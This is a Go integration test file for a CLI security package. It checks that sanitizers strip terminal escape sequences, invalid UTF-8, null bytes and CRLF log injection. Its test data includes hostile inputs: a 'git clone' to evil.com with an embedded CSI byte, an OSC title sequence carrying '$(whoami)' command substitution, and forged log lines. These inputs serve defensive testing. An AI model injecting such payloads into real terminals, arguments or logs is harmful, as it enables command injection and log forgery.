// pkg/security/integration_test.go
// Integration tests for the complete security system

package security

import (
	"context"
	"fmt"
	"strings"
	"testing"
	"unicode/utf8"

	"go.uber.org/zap"
)

// TestFullSecurityPipeline tests the complete security pipeline end-to-end
func TestFullSecurityPipeline(t *testing.T) {
	corpus := GetSecurityCorpus()
	ctx := context.Background()

	testCases := []struct {
		name         string
		attacks      []string
		useStrict    bool
		expectReject bool
	}{
		{
			name:         "CSI_Attacks_Normal_Mode",
			attacks:      corpus.CSIAttacks,
			useStrict:    false,
			expectReject: false,
		},
		{
			name:         "Terminal_Exploits_Strict_Mode",
			attacks:      corpus.TerminalExploits,
			useStrict:    true,
			expectReject: true, // Many should be rejected in strict mode
		},
		{
			name:         "CVE_Patterns_Strict_Mode",
			attacks:      corpus.CVEPatterns,
			useStrict:    true,
			expectReject: true,
		},
		{
			name:         "Complex_Attacks_Normal_Mode",
			attacks:      corpus.ComplexAttacks,
			useStrict:    false,
			expectReject: false,
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			var sanitizer *InputSanitizer
			if tc.useStrict {
				sanitizer = NewStrictSanitizer()
			} else {
				sanitizer = NewInputSanitizer()
			}

			output := NewSecureOutput(ctx)
			rejectedCount := 0
			processedCount := 0

			for i, attack := range tc.attacks {
				t.Run(fmt.Sprintf("Attack_%d", i), func(t *testing.T) {
					// Phase 1: Input sanitization
					sanitized, err := sanitizer.SanitizeInput(attack)
					if err != nil {
						rejectedCount++
						if !tc.expectReject {
							t.Errorf("Unexpected rejection of attack %q: %v", attack, err)
						}
						return
					}

					processedCount++

					// Validate sanitized input
					if !utf8.ValidString(sanitized) {
						t.Errorf("Sanitizer produced invalid UTF-8 for attack %q", attack)
					}

					// Phase 2: Use sanitized input in argument processing
					args := []string{"command", sanitized, "additional_arg"}
					cleanArgs, err := sanitizer.SanitizeArguments(args)
					if err != nil {
						t.Errorf("Argument sanitization failed for %q: %v", sanitized, err)
						return
					}

					// Phase 3: Generate secure output
					output.Info("Processing attack", zap.String("original", attack), zap.String("sanitized", sanitized))
					output.Result("attack_processing", map[string]interface{}{
						"attack_type": tc.name,
						"original":    attack,
						"sanitized":   sanitized,
						"args":        cleanArgs,
					})

					// Phase 4: Validate the entire pipeline worked
					for _, arg := range cleanArgs {
						if strings.ContainsRune(arg, CSI) {
							t.Errorf("CSI character survived full pipeline for attack %q", attack)
						}
					}
				})
			}

			// Validate rejection rate for strict mode
			if tc.expectReject && rejectedCount == 0 {
				t.Errorf("Expected some rejections in strict mode for %s, but none occurred", tc.name)
			}

			t.Logf("%s: Processed %d attacks, rejected %d", tc.name, processedCount, rejectedCount)
		})
	}
}

// TestRegressionPrevention ensures the original three vulnerabilities remain fixed
func TestRegressionPrevention(t *testing.T) {
	regressionTests := []struct {
		name     string
		attack   string
		vulnType string
		check    func(t *testing.T, original, sanitized string)
	}{
		{
			name:     "CVE-2022-24765_CSI_Injection",
			attack:   "git clone https://evil.com" + string(rune(0x9b)) + "6n",
			vulnType: "CSI Injection",
			check: func(t *testing.T, original, sanitized string) {
				if strings.ContainsRune(sanitized, CSI) {
					t.Errorf("CSI injection vulnerability regression: CSI character not removed")
				}
			},
		},
		{
			name:     "UTF8_Overlong_Encoding",
			attack:   "user\xc0\x80admin", // Overlong encoding of null
			vulnType: "UTF-8 Validation",
			check: func(t *testing.T, original, sanitized string) {
				if !utf8.ValidString(sanitized) {
					t.Errorf("UTF-8 validation vulnerability regression: invalid UTF-8 in output")
				}
				if strings.ContainsRune(sanitized, 0) {
					t.Errorf("UTF-8 validation vulnerability regression: null byte in output")
				}
			},
		},
		{
			name:     "Parser_State_Confusion_Mixed_Control",
			attack:   "\x1b[31mred\x9b\x00null\x1b[0m\xff\xfe",
			vulnType: "Parser State Confusion",
			check: func(t *testing.T, original, sanitized string) {
				if !utf8.ValidString(sanitized) {
					t.Errorf("Parser confusion vulnerability regression: invalid UTF-8")
				}
				if strings.ContainsRune(sanitized, CSI) {
					t.Errorf("Parser confusion vulnerability regression: CSI character remains")
				}
				if strings.ContainsRune(sanitized, 0) {
					t.Errorf("Parser confusion vulnerability regression: null byte remains")
				}
			},
		},
		{
			name:     "Terminal_Title_Command_Injection",
			attack:   "\x1b]0;$(whoami)\x07",
			vulnType: "Terminal Manipulation",
			check: func(t *testing.T, original, sanitized string) {
				if strings.Contains(sanitized, "$(") {
					t.Errorf("Command injection remains in sanitized output")
				}
				if strings.Contains(sanitized, "\x1b]") {
					t.Errorf("OSC sequence not properly removed")
				}
			},
		},
		{
			name:     "Log_Injection_CRLF",
			attack:   "user\r\nINFO: Fake log entry\r\n",
			vulnType: "Log Injection",
			check: func(t *testing.T, original, sanitized string) {
				// Should be handled by EscapeForLogging
				escaped := EscapeForLogging(sanitized)
				if strings.Contains(escaped, "\r\n") {
					t.Errorf("Log injection vulnerability: unescaped CRLF in log output")
				}
			},
		},
	}

	for _, test := range regressionTests {
		t.Run(test.name, func(t *testing.T) {
			// Test with both sanitizers
			sanitizers := []*InputSanitizer{
				NewInputSanitizer(),
				NewStrictSanitizer(),
			}

			for i, sanitizer := range sanitizers {
				sanitizerName := "Normal"
				if i == 1 {
					sanitizerName = "Strict"
				}

				t.Run(sanitizerName, func(t *testing.T) {
					result, err := sanitizer.SanitizeInput(test.attack)

					// Strict mode may reject dangerous input
					if i == 1 && err != nil {
						t.Logf("Strict mode rejected %s attack (expected): %v", test.vulnType, err)
						return
					}

					if err != nil {
						t.Errorf("Sanitizer failed on %s attack: %v", test.vulnType, err)
						return
					}

					// Run specific vulnerability check
					test.check(t, test.attack, result)
				})
			}
		})
	}
}

// TestPerformanceRegression ensures security fixes don't severely impact performance
func TestPerformanceRegression(t *testing.T) {
	// This is a basic performance regression test
	// More detailed benchmarks are in performance_test.go

	sanitizer := NewInputSanitizer()
	normalInput := "normal command with some parameters"

	// Baseline timing for normal input
	iterations := 10000
	start := testing.Benchmark(func(b *testing.B) {
		for i := 0; i < iterations; i++ {
			_, _ = sanitizer.SanitizeInput(normalInput)
		}
	})

	// Timing for malicious input
	maliciousInput := strings.Repeat(string(rune(0x9b))+"[31m", 100) + "text"
	malicious := testing.Benchmark(func(b *testing.B) {
		for i := 0; i < iterations; i++ {
			_, _ = sanitizer.SanitizeInput(maliciousInput)
		}
	})

	// Performance should not degrade more than 10x for malicious input
	if malicious.NsPerOp() > start.NsPerOp()*10 {
		t.Errorf("Performance regression: malicious input processing is %dx slower than normal input",
			malicious.NsPerOp()/start.NsPerOp())
	}

	t.Logf("Performance: normal=%dns/op, malicious=%dns/op", start.NsPerOp(), malicious.NsPerOp())
}

// TestCompleteWorkflowSecurity tests realistic command workflows
func TestCompleteWorkflowSecurity(t *testing.T) {
	workflows := []struct {
		name        string
		command     string
		args        []string
		description string
	}{
		{
			name:    "File_Operation_With_CSI",
			command: "create",
			args: []string{
				"file",
				"/tmp/test" + string(rune(0x9b)) + "6n.txt",
				"content\x1b[31mwith\x1b[0mformatting",
			},
			description: "File creation with CSI injection in filename and content",
		},
		{
			name:    "User_Management_With_UTF8_Attack",
			command: "create",
			args: []string{
				"user",
				"admin\xc0\x80",    // Overlong encoding
				"password\xff\xfe", // Invalid UTF-8
			},
			description: "User creation with UTF-8 attacks",
		},
		{
			name:    "System_Command_With_Log_Injection",
			command: "secure",
			args: []string{
				"system",
				"setting\r\nINFO: Fake log\r\n",
				"value\nERROR: Injected error\n",
			},
			description: "System security with log injection attempts",
		},
		{
			name:    "Complex_Mixed_Attack",
			command: "update",
			args: []string{
				"config\x1b]0;$(whoami)\x07", // OSC command injection
				"key\x9b[31m",                // CSI with color
				"value\xff\xfe\x00\x1b[2J",   // Mixed UTF-8, null, and ANSI
			},
			description: "Complex attack combining multiple vectors",
		},
	}

	for _, workflow := range workflows {
		t.Run(workflow.name, func(t *testing.T) {
			sanitizer := NewInputSanitizer()
			ctx := context.Background()
			output := NewSecureOutput(ctx)

			// Simulate command processing pipeline

			// Step 1: Validate command name
			err := ValidateCommandName(workflow.command)
			if err != nil {
				t.Errorf("Command name validation failed for %s: %v", workflow.command, err)
				return
			}

			// Step 2: Sanitize arguments
			cleanArgs, err := sanitizer.SanitizeArguments(workflow.args)
			if err != nil {
				t.Errorf("Argument sanitization failed for %s: %v", workflow.description, err)
				return
			}

			// Step 3: Process and generate output
			output.Info("Processing command",
				zap.String("command", workflow.command),
				zap.Strings("original_args", workflow.args),
				zap.Strings("sanitized_args", cleanArgs))

			// Step 4: Validate complete security
			for i, arg := range cleanArgs {
				// Must be valid UTF-8
				if !utf8.ValidString(arg) {
					t.Errorf("Workflow %s: argument %d has invalid UTF-8", workflow.name, i)
				}

				// Must not contain dangerous characters
				if strings.ContainsRune(arg, CSI) {
					t.Errorf("Workflow %s: argument %d contains CSI character", workflow.name, i)
				}

				if strings.ContainsRune(arg, 0) {
					t.Errorf("Workflow %s: argument %d contains null byte", workflow.name, i)
				}

				// Check for unescaped control characters
				for _, r := range arg {
					if r < 32 && r != '\n' && r != '\t' {
						t.Errorf("Workflow %s: argument %d contains control character 0x%02x",
							workflow.name, i, r)
					}
				}
			}

			// Step 5: Simulate command result
			result := map[string]interface{}{
				"command":   workflow.command,
				"args":      cleanArgs,
				"status":    "success",
				"processed": len(cleanArgs),
			}

			output.Result("workflow_completed", result,
				zap.String("workflow", workflow.name),
				zap.String("description", workflow.description))

			t.Logf("Workflow %s completed successfully", workflow.name)
		})
	}
}

// TestSecurityComplianceValidation ensures all security requirements are met
func TestSecurityComplianceValidation(t *testing.T) {
	t.Run("No_Direct_Output_Functions", func(t *testing.T) {
		// This would normally be enforced by linting rules
		// Here we just validate that our secure output works
		ctx := context.Background()
		output := NewSecureOutput(ctx)

		// Test that all output methods work without panicking
		output.Info("Compliance test")
		output.Success("Test passed")
		output.Warning("Test warning")
		output.Error("Test error", fmt.Errorf("test"))
		output.Result("test", "data")
		output.Progress("testing", 1, 2)
		output.List("items", []string{"item1", "item2"})
		output.Table("table", []string{"col1"}, [][]string{{"val1"}})
	})

	t.Run("All_Input_Sanitized", func(t *testing.T) {
		// Validate that the sanitization system handles all input types
		sanitizer := NewInputSanitizer()

		// Test various input types that might occur in CLI
		inputs := []string{
			"command argument",
			"/path/to/file",
			"user@domain.com",
			"192.168.1.1",
			"key=value",
			"--flag-name",
			"environment=production",
		}

		for _, input := range inputs {
			result, err := sanitizer.SanitizeInput(input)
			if err != nil {
				t.Errorf("Normal input failed sanitization: %s", input)
			}
			if !utf8.ValidString(result) {
				t.Errorf("Sanitization produced invalid UTF-8 for normal input: %s", input)
			}
		}
	})

	t.Run("Structured_Logging_Integration", func(t *testing.T) {
		// Validate integration with structured logging
		ctx := context.Background()
		output := NewSecureOutput(ctx)

		// Test complex structured data
		complexData := map[string]interface{}{
			"users": []string{"alice", "bob"},
			"config": map[string]string{
				"host": "localhost",
				"port": "8080",
			},
			"metrics": map[string]interface{}{
				"requests": 1000,
				"errors":   5,
				"uptime":   "99.95%",
			},
		}

		output.Result("compliance_test", complexData,
			zap.String("test_type", "structured_logging"),
			zap.Bool("passed", true))
	})
}
